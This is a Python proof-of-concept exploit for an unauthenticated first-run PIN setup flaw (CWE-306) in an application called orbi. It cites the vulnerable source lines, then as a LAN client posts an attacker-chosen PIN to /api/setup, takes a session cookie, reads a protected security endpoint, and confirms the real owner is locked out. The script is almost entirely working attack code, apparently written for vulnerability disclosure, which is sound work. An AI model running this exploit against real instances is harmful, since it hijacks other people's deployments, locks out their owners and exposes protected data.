#!/usr/bin/env python3
"""PoC 1 — unauthenticated first-run PIN setup (CWE-306, High).

Vulnerable code:
  orbi/web.py:29       OPEN_PATHS includes "/api/setup"
  orbi/web.py:234      auth middleware skips paths in OPEN_PATHS
  orbi/web.py:299-309  setup() only checks pin_hash is empty and len(pin) >= 6
  orbi/__main__.py:63  server listens on 0.0.0.0

Usage: python3 poc1_lan_setup_takeover.py http://<host-ip>:8470
Only run against a disposable, unconfigured instance: this sets the app PIN.
"""
import argparse
import http.cookiejar
import json
import urllib.error
import urllib.request


def call(base, path, payload=None, opener=None):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(
        base.rstrip("/") + path,
        data=data,
        headers={"Content-Type": "application/json"} if data else {},
    )
    return (opener.open(req, timeout=10) if opener else urllib.request.urlopen(req, timeout=10))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base_url", help="e.g. http://192.168.1.50:8470")
    ap.add_argument("--pin", default="ATTACKER123")
    args = ap.parse_args()

    jar = http.cookiejar.CookieJar()
    attacker = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    before = json.load(call(args.base_url, "/api/session", opener=attacker))
    print(f"[*] before: pin_set={before['pin_set']} authenticated={before['authenticated']}")
    if before["pin_set"]:
        print("[!] target already configured — this PoC only applies to first-run state")
        return 2

    result = json.load(call(args.base_url, "/api/setup", {"pin": args.pin}, opener=attacker))
    print(f"[+] POST /api/setup {{pin: {args.pin!r}}} -> {result}")
    print(f"[+] session cookie issued: {[c.name for c in jar]}")

    protected = json.load(call(args.base_url, "/api/security", opener=attacker))
    after = json.load(call(args.base_url, "/api/session", opener=attacker))
    print(f"[+] authenticated /api/security readable ({len(protected.get('bans', []))} bans)")
    print(f"[+] after: pin_set={after['pin_set']} authenticated={after['authenticated']}")

    try:
        call(args.base_url, "/api/setup", {"pin": "OWNER-PIN"})
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"[+] owner's later /api/setup -> HTTP {e.code}: {body}")
        assert e.code == 409, "expected setup lockout"

    assert after["authenticated"] and list(jar)
    print("[+] CONFIRMED: unauthenticated LAN client set the PIN and owns a valid session")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
